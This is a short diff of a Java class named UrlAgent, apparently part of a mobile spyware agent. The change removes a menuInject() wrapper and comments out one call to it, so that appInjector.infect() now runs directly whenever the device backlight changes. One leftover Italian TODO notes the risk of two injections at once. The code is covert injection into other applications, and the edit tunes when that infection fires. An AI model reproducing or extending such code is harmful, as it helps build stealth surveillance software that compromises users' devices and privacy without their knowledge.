@@ -90,14 +90,6 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
 
     }
 
-    private void menuInject() {
-        //#ifdef DEBUG
-        debug.trace("menuInject");
-        //#endif
-
-        appInjector.infect();
-    }
-
     public synchronized void actualStop() {
         //#ifdef DEBUG
         debug.trace("actualStop");
@@ -123,11 +115,11 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
             appInjector.callMenuInContext();
         }
 
-        if (!appInjector.isInfected() && infecting == false) {
+/*        if (!appInjector.isInfected() && infecting == false) {
             infecting = true;
             menuInject();
         }
-
+*/
     }
 
     /*
@@ -165,8 +157,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
             debug.info("onBacklightChange, injecting");
             //#endif
 
-            //TODO: qui bisogna verificare che non avvengano due injection alla volta
-            menuInject();
+            appInjector.infect();
         }
     }
 
